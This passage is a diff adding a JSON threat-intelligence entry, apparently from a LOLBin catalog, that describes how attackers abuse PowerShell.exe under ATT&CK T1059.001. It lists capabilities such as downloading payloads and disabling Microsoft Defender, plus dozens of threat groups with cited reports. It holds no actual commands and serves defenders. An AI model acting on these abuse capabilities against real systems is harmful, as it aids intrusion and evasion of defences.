@@ -1,0 +1,2519 @@
+{
+  "type": "lolbin",
+  "version": 2,
+  "id": "58851cad-7f6d-423c-992a-60426d955099",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-16T00:15:00.000Z",
+  "modified": "2026-10-16T00:15:00.000Z",
+  "name": "PowerShell.exe",
+  "image": "powershell.exe",
+  "description": "PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.",
+  "attack": {
+    "id": "T1059.001",
+    "name": "PowerShell",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1059/001",
+    "version": "20.0"
+  },
+  "summary": [
+    "Execute commands and scripts",
+    "Download and run executables from the Internet, from disk or in memory",
+    "Discover information about the system and the domain",
+    "Run commands on remote computers with Invoke-Command (requires administrator permissions)",
+    "Disable Microsoft Defender real-time monitoring and add exclusions"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "hashes": {
+    "MD5": "04029E121A0CFA5991749937DD22A1D9"
+  },
+  "capabilities": [
+    "Execute",
+    "Download"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0002:Execution:T1059.001"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "Akira",
+        "attack_id": "G1024",
+        "evidence": "uses T1059.001",
+        "description": "Akira has used PowerShell scripts for credential harvesting and privilege escalation.",
+        "sources": "Cisco Akira Ransomware OCT 2024 https://blog.talosintelligence.com/akira-ransomware-continues-to-evolve/"
+      },
+      {
+        "name": "APT-C-36",
+        "attack_id": "G0099",
+        "evidence": "uses T1059.001",
+        "description": "APT-C-36 has used PowerShell in malware execution including as part of fileless attack chains to download additional payloads.",
+        "sources": "Kaspersky BlindEagle AUG 2024 https://securelist.com/blindeagle-apt/113414/; Zscaler BlindEagle DEC 2025 https://www.zscaler.com/blogs/security-research/blindeagle-targets-colombian-government-agency-caminho-and-dcrat"
+      },
+      {
+        "name": "APT19",
+        "attack_id": "G0073",
+        "evidence": "uses T1059.001",
+        "description": "APT19 used PowerShell commands to execute payloads.",
+        "sources": "FireEye APT19 https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html"
+      },
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": "uses T1059.001",
+        "description": "APT28 downloads and executes PowerShell scripts and performs PowerShell commands.",
+        "sources": "Palo Alto Sofacy 06-2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/; TrendMicro Pawn Storm Dec 2020 https://www.trendmicro.com/en_us/research/20/l/pawn-storm-lack-of-sophistication-as-a-strategy.html; Cybersecurity Advisory GRU Brute Force Campaign July 2021 https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
+      },
+      {
+        "name": "APT29",
+        "attack_id": "G0016",
+        "evidence": "uses T1059.001",
+        "description": "APT29 has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.",
+        "sources": "Mandiant No Easy Breach https://www.slideshare.net/slideshow/no-easy-breach-derby-con-2016/66447908; ESET T3 Threat Report 2021 https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf; Secureworks IRON HEMLOCK Profile http://www.secureworks.com/research/threat-profiles/iron-hemlock; Symantec Seaduke 2015 https://web.archive.org/web/20150717011546/http://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory"
+      },
+      {
+        "name": "APT3",
+        "attack_id": "G0022",
+        "evidence": "uses T1059.001",
+        "description": "APT3 has used PowerShell on victim systems to download and run payloads after exploitation.",
+        "sources": "FireEye Operation Double Tap https://www.fireeye.com/blog/threat-research/2014/11/operation_doubletap.html"
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": "uses T1059.001",
+        "description": "APT32 has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.",
+        "sources": "FireEye APT32 May 2017 https://www.fireeye.com/blog/threat-research/2017/05/cyber-espionage-apt32.html; Cybereason Oceanlotus May 2017 https://www.cybereason.com/blog/operation-cobalt-kitty-apt; Cybereason Cobalt Kitty 2017 https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "name": "APT33",
+        "attack_id": "G0064",
+        "evidence": "uses T1059.001",
+        "description": "APT33 has utilized PowerShell to download files from the C2 server and run various scripts.",
+        "sources": "Symantec Elfin Mar 2019 https://www.symantec.com/blogs/threat-intelligence/elfin-apt33-espionage; Microsoft Holmium June 2020 https://www.microsoft.com/security/blog/2020/06/18/inside-microsoft-threat-protection-mapping-attack-chains-from-cloud-to-endpoint/"
+      },
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": "uses T1059.001",
+        "description": "APT38 has used PowerShell to execute commands and other operational tasks. APT38 has also used PowerShell to establish persistence and establish C2 communication on compromised hosts.",
+        "sources": "CISA AA20-239A BeagleBoyz August 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-239a; Microsoft Axios Compromise APR 2026 https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/; MIcrosoft Mastra npm Compromise JUN 2026 https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/"
+      },
+      {
+        "name": "APT39",
+        "attack_id": "G0087",
+        "evidence": "uses T1059.001",
+        "description": "APT39 has used PowerShell to execute malicious code.",
+        "sources": "BitDefender Chafer May 2020 https://www.bitdefender.com/blog/labs/iranian-chafer-apt-targeted-air-transportation-and-government-in-kuwait-and-saudi-arabia/; Symantec Chafer February 2018 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions"
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": "uses T1059.001",
+        "description": "APT41 leveraged PowerShell to deploy malware families in victims’ environments.",
+        "sources": "FireEye APT41 Aug 2019 https://www.mandiant.com/sites/default/files/2022-02/rt-apt41-dual-operation.pdf; FireEye APT41 March 2020 https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html"
+      },
+      {
+        "name": "APT42",
+        "attack_id": "G1044",
+        "evidence": "uses T1059.001",
+        "description": "APT42 has downloaded and executed PowerShell payloads.",
+        "sources": "Mandiant APT42-charms https://services.google.com/fh/files/misc/apt42-crooked-charms-cons-and-compromises.pdf"
+      },
+      {
+        "name": "APT5",
+        "attack_id": "G1023",
+        "evidence": "uses T1059.001",
+        "description": "APT5 has used PowerShell to accomplish tasks within targeted environments.",
+        "sources": "Mandiant Pulse Secure Update May 2021 https://www.mandiant.com/resources/blog/updates-on-chinese-apt-compromising-pulse-secure-vpn-devices"
+      },
+      {
+        "name": "Aquatic Panda",
+        "attack_id": "G0143",
+        "evidence": "uses T1059.001",
+        "description": "Aquatic Panda has downloaded additional scripts and executed Base64 encoded commands in PowerShell.",
+        "sources": "CrowdStrike AQUATIC PANDA December 2021 https://www.crowdstrike.com/blog/overwatch-exposes-aquatic-panda-in-possession-of-log-4-shell-exploit-tools/"
+      },
+      {
+        "name": "BlackByte",
+        "attack_id": "G1043",
+        "evidence": "uses T1059.001",
+        "description": "BlackByte used encoded PowerShell commands during operations. BlackByte has used remote PowerShell commands in victim networks.",
+        "sources": "Microsoft BlackByte 2023 https://www.microsoft.com/en-us/security/blog/2023/07/06/the-five-day-job-a-blackbyte-ransomware-intrusion-case-study/; FBI BlackByte 2022 https://www.ic3.gov/CSA/2022/220211.pdf"
+      },
+      {
+        "name": "Blue Mockingbird",
+        "attack_id": "G0108",
+        "evidence": "uses T1059.001",
+        "description": "Blue Mockingbird has used PowerShell reverse TCP shells to issue interactive commands over a network connection.",
+        "sources": "RedCanary Mockingbird May 2020 https://redcanary.com/blog/blue-mockingbird-cryptominer/"
+      },
+      {
+        "name": "BRONZE BUTLER",
+        "attack_id": "G0060",
+        "evidence": "uses T1059.001",
+        "description": "BRONZE BUTLER has used PowerShell for execution.",
+        "sources": "Secureworks BRONZE BUTLER Oct 2017 https://www.secureworks.com/research/bronze-butler-targets-japanese-businesses"
+      },
+      {
+        "name": "Chimera",
+        "attack_id": "G0114",
+        "evidence": "uses T1059.001",
+        "description": "Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.",
+        "sources": "Cycraft Chimera April 2020 https://web.archive.org/web/20231214094657/https://cycraft.com/download/CyCraft-Whitepaper-Chimera_V4.1.pdf; NCC Group Chimera January 2021 https://web.archive.org/web/20230218064220/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/"
+      },
+      {
+        "name": "Cinnamon Tempest",
+        "attack_id": "G1021",
+        "evidence": "uses T1059.001",
+        "description": "Cinnamon Tempest has used PowerShell to communicate with C2, download files, and execute reconnaissance commands.",
+        "sources": "Sygnia Emperor Dragonfly October 2022 https://blog.sygnia.co/revealing-emperor-dragonfly-a-chinese-ransomware-group"
+      },
+      {
+        "name": "Cobalt Group",
+        "attack_id": "G0080",
+        "evidence": "uses T1059.001",
+        "description": "Cobalt Group has used powershell.exe to download and execute scripts.",
+        "sources": "TrendMicro Cobalt Group Nov 2017 https://blog.trendmicro.com/trendlabs-security-intelligence/cobalt-spam-runs-use-macros-cve-2017-8759-exploit/; RiskIQ Cobalt Jan 2018 https://web.archive.org/web/20190508170147/https://www.riskiq.com/blog/labs/cobalt-group-spear-phishing-russian-banks/; Group IB Cobalt Aug 2017 https://www.group-ib.com/blog/cobalt; PTSecurity Cobalt Dec 2016 https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-Snatch-eng.pdf; PTSecurity Cobalt Group Aug 2017 https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Cobalt-2017-eng.pdf; Talos Cobalt Group July 2018 https://blog.talosintelligence.com/2018/07/multiple-cobalt-personality-disorder.html"
+      },
+      {
+        "name": "Confucius",
+        "attack_id": "G0142",
+        "evidence": "uses T1059.001",
+        "description": "Confucius has used PowerShell to execute malicious files and payloads.",
+        "sources": "TrendMicro Confucius APT Aug 2021 https://www.trendmicro.com/en_us/research/21/h/confucius-uses-pegasus-spyware-related-lures-to-target-pakistani.html"
+      },
+      {
+        "name": "CopyKittens",
+        "attack_id": "G0052",
+        "evidence": "uses T1059.001",
+        "description": "CopyKittens has used PowerShell Empire.",
+        "sources": "ClearSky Wilted Tulip July 2017 http://www.clearskysec.com/wp-content/uploads/2017/07/Operation_Wilted_Tulip.pdf"
+      },
+      {
+        "name": "CURIUM",
+        "attack_id": "G1012",
+        "evidence": "uses T1059.001",
+        "description": "CURIUM has leveraged PowerShell scripts for initial process execution and data gathering in victim environments.",
+        "sources": "Symantec Tortoiseshell 2019 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain"
+      },
+      {
+        "name": "Daggerfly",
+        "attack_id": "G1034",
+        "evidence": "uses T1059.001",
+        "description": "Daggerfly used PowerShell to download and execute remote-hosted files on victim systems.",
+        "sources": "Symantec Daggerfly 2023 https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+      },
+      {
+        "name": "DarkHydrus",
+        "attack_id": "G0079",
+        "evidence": "uses T1059.001",
+        "description": "DarkHydrus leveraged PowerShell to download and execute additional scripts for execution.",
+        "sources": "Unit 42 DarkHydrus July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-new-threat-actor-group-darkhydrus-targets-middle-east-government/; Unit 42 Playbook Dec 2017 https://web.archive.org/web/20230702043312/https://pan-unit42.github.io/playbook_viewer/"
+      },
+      {
+        "name": "DarkVishnya",
+        "attack_id": "G0105",
+        "evidence": "uses T1059.001",
+        "description": "DarkVishnya used PowerShell to create shellcode loaders.",
+        "sources": "Securelist DarkVishnya Dec 2018 https://securelist.com/darkvishnya/89169/"
+      },
+      {
+        "name": "Deep Panda",
+        "attack_id": "G0009",
+        "evidence": "uses T1059.001",
+        "description": "Deep Panda has used PowerShell scripts to download and execute programs in memory, without writing to disk.",
+        "sources": "Alperovitch 2014 https://web.archive.org/web/20200424075623/https:/www.crowdstrike.com/blog/deep-thought-chinese-targeting-national-security-think-tanks/"
+      },
+      {
+        "name": "Dragonfly",
+        "attack_id": "G0035",
+        "evidence": "uses T1059.001",
+        "description": "Dragonfly has used PowerShell scripts for execution.",
+        "sources": "US-CERT TA18-074A https://www.us-cert.gov/ncas/alerts/TA18-074A; Symantec Dragonfly Sept 2017 https://docs.broadcom.com/doc/dragonfly_threat_against_western_energy_suppliers"
+      },
+      {
+        "name": "Earth Lusca",
+        "attack_id": "G1006",
+        "evidence": "uses T1059.001",
+        "description": "Earth Lusca has used PowerShell to execute commands.",
+        "sources": "TrendMicro EarthLusca 2022 https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+      },
+      {
+        "name": "Ember Bear",
+        "attack_id": "G1003",
+        "evidence": "uses T1059.001",
+        "description": "Ember Bear has used PowerShell commands to gather information from compromised systems, such as email servers.",
+        "sources": "CISA GRU29155 2024 https://www.cisa.gov/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf"
+      },
+      {
+        "name": "FIN10",
+        "attack_id": "G0051",
+        "evidence": "uses T1059.001",
+        "description": "FIN10 uses PowerShell for execution as well as PowerShell Empire to establish persistence.",
+        "sources": "FireEye FIN10 June 2017 https://services.google.com/fh/files/misc/rpt-fin-10-anatomy-of-a-cyber-en.pdf; Github PowerShell Empire https://github.com/PowerShellEmpire/Empire"
+      },
+      {
+        "name": "FIN13",
+        "attack_id": "G1016",
+        "evidence": "uses T1059.001",
+        "description": "FIN13 has used PowerShell commands to obtain DNS data from a compromised network.",
+        "sources": "Mandiant FIN13 Aug 2022 https://www.mandiant.com/resources/blog/fin13-cybercriminal-mexico"
+      },
+      {
+        "name": "FIN6",
+        "attack_id": "G0037",
+        "evidence": "uses T1059.001",
+        "description": "FIN6 has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.",
+        "sources": "FireEye FIN6 April 2016 https://web.archive.org/web/20190807112824/https://www2.fireeye.com/rs/848-DID-242/images/rpt-fin6.pdf; FireEye FIN6 Apr 2019 https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html; Visa FIN6 Feb 2019 https://usa.visa.com/dam/VCOM/global/support-legal/documents/fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf"
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": "uses T1059.001",
+        "description": "FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload. Additionally, FIN7 has executed a custom obfuscation of the shellcode invoker in PowerSploit called POWERTRASH.",
+        "sources": "BlackBerry_FIN7_April2024 https://blogs.blackberry.com/en/2024/04/fin7-targets-the-united-states-automotive-industry; Mandiant FIN7 Apr 2022 https://www.mandiant.com/resources/evolution-of-fin7; FireEye FIN7 April 2017 https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html; Gemini_FIN7_Jan2022 https://geminiadvisory.io/fin7-flash-drives-spread-remote-access-trojan/; Morphisec FIN7 June 2017 http://blog.morphisec.com/fin7-attacks-restaurant-industry; FBI Flash FIN7 USB https://therecord.media/fbi-fin7-hackers-target-us-companies-with-badusb-devices-to-install-ransomware/"
+      },
+      {
+        "name": "FIN8",
+        "attack_id": "G0061",
+        "evidence": "uses T1059.001",
+        "description": "FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access.",
+        "sources": "FireEye Obfuscation June 2017 https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html; FireEye Know Your Enemy FIN8 Aug 2016 https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html; Bitdefender FIN8 July 2021 https://businessinsights.bitdefender.com/deep-dive-into-a-fin8-attack-a-forensic-investigation; Symantec FIN8 Jul 2023 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/syssphinx-fin8-backdoor"
+      },
+      {
+        "name": "Fox Kitten",
+        "attack_id": "G0117",
+        "evidence": "uses T1059.001",
+        "description": "Fox Kitten has used PowerShell scripts to access credential data.",
+        "sources": "CISA AA20-259A Iran-Based Actor September 2020 https://us-cert.cisa.gov/ncas/alerts/aa20-259a"
+      },
+      {
+        "name": "GALLIUM",
+        "attack_id": "G0093",
+        "evidence": "uses T1059.001",
+        "description": "GALLIUM used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.",
+        "sources": "Cybereason Soft Cell June 2019 https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"
+      },
+      {
+        "name": "Gallmaker",
+        "attack_id": "G0084",
+        "evidence": "uses T1059.001",
+        "description": "Gallmaker used PowerShell to download additional payloads and for execution.",
+        "sources": "Symantec Gallmaker Oct 2018 https://www.symantec.com/blogs/threat-intelligence/gallmaker-attack-group"
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "uses T1059.001",
+        "description": "Gamaredon Group has used obfuscated PowerShell scripts for staging. Additionally, (LinkById : G0047) has used PowerShell based tools later in its attack chain. Additionally, Gamaredon Group has used the PowerShell cmdlet `Get-Command` to download and execute the next stage payload.",
+        "sources": "Microsoft Actinium February 2022 https://www.microsoft.com/security/blog/2022/02/04/actinium-targets-ukrainian-organizations/; ESET Gamaredon Sept2024 https://web-assets.esetstatic.com/wls/en/papers/white-papers/cyberespionage-gamaredon-way.pdf; SymantecCarbonBlack_ShuckwormUSB_Apr2025 https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel; VenereCiscoTalos_Gamaredon_Mar2025 https://blog.talosintelligence.com/gamaredon-campaign-distribute-remcos/"
+      },
+      {
+        "name": "GOLD SOUTHFIELD",
+        "attack_id": "G0115",
+        "evidence": "uses T1059.001",
+        "description": "GOLD SOUTHFIELD has staged and executed PowerShell scripts on compromised hosts.",
+        "sources": "Tetra Defense Sodinokibi March 2020 https://web.archive.org/web/20210414101816/https://tetradefense.com/incident-response-services/cause-and-effect-sodinokibi-ransomware-analysis/"
+      },
+      {
+        "name": "Gorgon Group",
+        "attack_id": "G0078",
+        "evidence": "uses T1059.001",
+        "description": "Gorgon Group malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim’s machine.",
+        "sources": "Unit 42 Gorgon Group Aug 2018 https://researchcenter.paloaltonetworks.com/2018/08/unit42-gorgon-group-slithering-nation-state-cybercrime/"
+      },
+      {
+        "name": "HAFNIUM",
+        "attack_id": "G0125",
+        "evidence": "uses T1059.001",
+        "description": "HAFNIUM has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data.",
+        "sources": "Microsoft HAFNIUM March 2020 https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/; Volexity Exchange Marauder March 2021 https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/"
+      },
+      {
+        "name": "HEXANE",
+        "attack_id": "G1001",
+        "evidence": "uses T1059.001",
+        "description": "HEXANE has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.",
+        "sources": "Kaspersky APT Trends Q1 April 2021 https://securelist.com/apt-trends-report-q1-2021/101967; Kaspersky Lyceum October 2021 https://vblocalhost.com/uploads/VB2021-Kayal-etal.pdf; SecureWorks August 2019 https://www.secureworks.com/blog/lyceum-takes-center-stage-in-middle-east-campaign"
+      },
+      {
+        "name": "Inception",
+        "attack_id": "G0100",
+        "evidence": "uses T1059.001",
+        "description": "Inception has used PowerShell to execute malicious commands and payloads.",
+        "sources": "Unit 42 Inception November 2018 https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/; Kaspersky Cloud Atlas December 2014 https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/"
+      },
+      {
+        "name": "Indrik Spider",
+        "attack_id": "G0119",
+        "evidence": "uses T1059.001",
+        "description": "Indrik Spider has used PowerShell Empire for execution of malware.",
+        "sources": "Crowdstrike Indrik November 2018 https://www.crowdstrike.com/blog/big-game-hunting-the-evolution-of-indrik-spider-from-dridex-wire-fraud-to-bitpaymer-targeted-ransomware/; Symantec WastedLocker June 2020 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/wastedlocker-ransomware-us"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "uses T1059.001",
+        "description": "Kimsuky has executed a variety of PowerShell scripts including Invoke-Mimikatz. Kimsuky has also utilized PowerShell scripts for execution, persistence, and defense evasion. Kimsuky has leveraged PowerShell’s cmdlet `Expand-Archive` to extract contents of zip files into the same directory. Kimsuky has employed ClickFix type tactics enticing victims to copy and paste malicious PowerShell commands and scripts, where the scripts ultimately led to QuasarRAT.",
+        "sources": "EST Kimsuky April 2019 https://blog.alyac.co.kr/2234; Talos Kimsuky Nov 2021 https://blog.talosintelligence.com/2021/11/kimsuky-abuses-blogs-delivers-malware.html; CISA AA20-301A Kimsuky https://us-cert.cisa.gov/ncas/alerts/aa20-301a; Securonix Kimsuky February 2025 https://www.securonix.com/blog/analyzing-deepdrive-north-korean-threat-actors-observed-exploiting-trusted-platforms-for-targeted-attacks/; KISA Operation Muzabi https://web.archive.org/web/20220328121326/https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf; Mandiant APT43 March 2024 https://services.google.com/fh/files/misc/apt43-report-en.pdf; NaumaanProofpoint_GlobalClickFix_April2025 https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix; Aryaka Kimsuky July 2025 https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf"
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": "uses T1059.001",
+        "description": "Lazarus Group has used PowerShell to execute commands and malicious code.",
+        "sources": "Google TAG Lazarus Jan 2021 https://blog.google/threat-analysis-group/new-campaign-targeting-security-researchers/"
+      },
+      {
+        "name": "LazyScripter",
+        "attack_id": "G0140",
+        "evidence": "uses T1059.001",
+        "description": "LazyScripter has used PowerShell scripts to execute malicious code.",
+        "sources": "MalwareBytes LazyScripter Feb 2021 https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+      },
+      {
+        "name": "Leviathan",
+        "attack_id": "G0065",
+        "evidence": "uses T1059.001",
+        "description": "Leviathan has used PowerShell for execution.",
+        "sources": "Accenture MUDCARP March 2019 https://web.archive.org/web/20210722005437/https://www.accenture.com/_acnmedia/PDF-96/Accenture-Security-MUDCARP.pdf; Proofpoint Leviathan Oct 2017 https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets; CISA AA21-200A APT40 July 2021 https://us-cert.cisa.gov/ncas/alerts/aa21-200a; FireEye Periscope March 2018 https://www.fireeye.com/blog/threat-research/2018/03/suspected-chinese-espionage-group-targeting-maritime-and-engineering-industries.html"
+      },
+      {
+        "name": "Magic Hound",
+        "attack_id": "G0059",
+        "evidence": "uses T1059.001",
+        "description": "Magic Hound has used PowerShell for execution and privilege escalation.",
+        "sources": "DFIR Phosphorus November 2021 https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/; DFIR Report APT35 ProxyShell March 2022 https://thedfirreport.com/2022/03/21/apt35-automates-initial-access-using-proxyshell; Unit 42 Magic Hound Feb 2017 https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/; FireEye APT35 2018 https://static.carahsoft.com/concrete/files/1015/2779/3571/M-Trends-2018-Report.pdf; Microsoft Iranian Threat Actor Trends November 2021 https://www.microsoft.com/en-us/security/blog/2021/11/16/evolving-trends-in-iranian-threat-actor-activity-mstic-presentation-at-cyberwarcon-2021"
+      },
+      {
+        "name": "Medusa Group",
+        "attack_id": "G1051",
+        "evidence": "uses T1059.001",
+        "description": "Medusa Group has leveraged PowerShell for execution and defense evasion. Medusa Group has also utilized PowerShell to execute a bitsadmin transfer from file hosting site.",
+        "sources": "Palo Alto Unit 42 Medusa Group Medusa Ransomware January 2024 https://unit42.paloaltonetworks.com/medusa-ransomware-escalation-new-leak-site/; Check Point Medusa Ransomware April 2025 https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/medusa-ransomware-group/; CISA Medusa Group Medusa Ransomware March 2025 https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a; Intel471 Medusa Ransomware May 2025 https://www.intel471.com/blog/threat-hunting-case-study-medusa-ransomware"
+      },
+      {
+        "name": "menuPass",
+        "attack_id": "G0045",
+        "evidence": "uses T1059.001",
+        "description": "menuPass uses PowerSploit to inject shellcode into PowerShell.",
+        "sources": "PWC Cloud Hopper Technical Annex April 2017 https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf; Symantec Cicada November 2020 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage"
+      },
+      {
+        "name": "Molerats",
+        "attack_id": "G0021",
+        "evidence": "uses T1059.001",
+        "description": "Molerats used PowerShell implants on target machines.",
+        "sources": "Kaspersky MoleRATs April 2019 https://securelist.com/gaza-cybergang-group1-operation-sneakypastes/90068/"
+      },
+      {
+        "name": "MoustachedBouncer",
+        "attack_id": "G1019",
+        "evidence": "uses T1059.001",
+        "description": "MoustachedBouncer has used plugins to execute PowerShell scripts.",
+        "sources": "MoustachedBouncer ESET August 2023 https://www.welivesecurity.com/en/eset-research/moustachedbouncer-espionage-against-foreign-diplomats-in-belarus/"
+      },
+      {
+        "name": "MuddyWater",
+        "attack_id": "G0069",
+        "evidence": "uses T1059.001",
+        "description": "MuddyWater has used PowerShell for execution.",
+        "sources": "Talos MuddyWater May 2019 https://blog.talosintelligence.com/2019/05/recent-muddywater-associated-blackwater.html; ClearSky MuddyWater Nov 2018 https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf; DHS CISA AA22-055A MuddyWater February 2022 https://www.cisa.gov/uscert/ncas/alerts/aa22-055a; Securelist MuddyWater Oct 2018 https://securelist.com/muddywater/88059/; Talos MuddyWater Jan 2022 https://blog.talosintelligence.com/2022/01/iranian-apt-muddywater-targets-turkey.html; NaumaanProofpoint_GlobalClickFix_April2025 https://www.proofpoint.com/us/blog/threat-insight/around-world-90-days-state-sponsored-actors-try-clickfix; Trend Micro Muddy Water March 2021 https://www.trendmicro.com/en_us/research/21/c/earth-vetala---muddywater-continues-to-target-organizations-in-t.html; Reaqta MuddyWater November 2017 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/; FireEye MuddyWater Mar 2018 https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html; Symantec MuddyWater Dec 2018 https://www.symantec.com/blogs/threat-intelligence/seedworm-espionage-group; MuddyWater TrendMicro June 2018 https://blog.trendmicro.com/trendlabs-security-intelligence/another-potential-muddywater-campaign-uses-powershell-based-prb-backdoor/"
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": "uses T1059.001",
+        "description": "Mustang Panda has used malicious PowerShell scripts to enable execution.",
+        "sources": "Anomali MUSTANG PANDA October 2019 https://www.anomali.com/blog/china-based-apt-mustang-panda-targets-minority-groups-public-and-private-sector-organizations; Crowdstrike MUSTANG PANDA June 2018 https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-june-mustang-panda/; Unit42 Chinese VSCode 06 September 2024 https://unit42.paloaltonetworks.com/stately-taurus-abuses-vscode-southeast-asian-espionage/"
+      },
+      {
+        "name": "NIMBUS MANTICORE",
+        "attack_id": "G1059",
+        "evidence": "uses T1059.001",
+        "description": "NIMBUS MANTICORE has leveraged PowerShell scripts to execute commands in the victim environment.",
+        "sources": "Mandiant_UNC1549TTPsTools_Nov2025 https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense"
+      },
+      {
+        "name": "Nomadic Octopus",
+        "attack_id": "G0133",
+        "evidence": "uses T1059.001",
+        "description": "Nomadic Octopus has used PowerShell for execution.",
+        "sources": "ESET Nomadic Octopus 2018 https://www.virusbulletin.com/uploads/pdf/conference_slides/2018/Cherepanov-VB2018-Octopus.pdf"
+      },
+      {
+        "name": "OilRig",
+        "attack_id": "G0049",
+        "evidence": "uses T1059.001",
+        "description": "OilRig has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.",
+        "sources": "Trend Micro Earth Simnavaz October 2024 https://www.trendmicro.com/en_us/research/24/j/earth-simnavaz-cyberattacks.html; OilRig New Delivery Oct 2017 https://researchcenter.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/; Crowdstrike Helix Kitten Nov 2018 https://www.crowdstrike.com/blog/meet-crowdstrikes-adversary-of-the-month-for-november-helix-kitten/; FireEye APT34 Dec 2017 https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
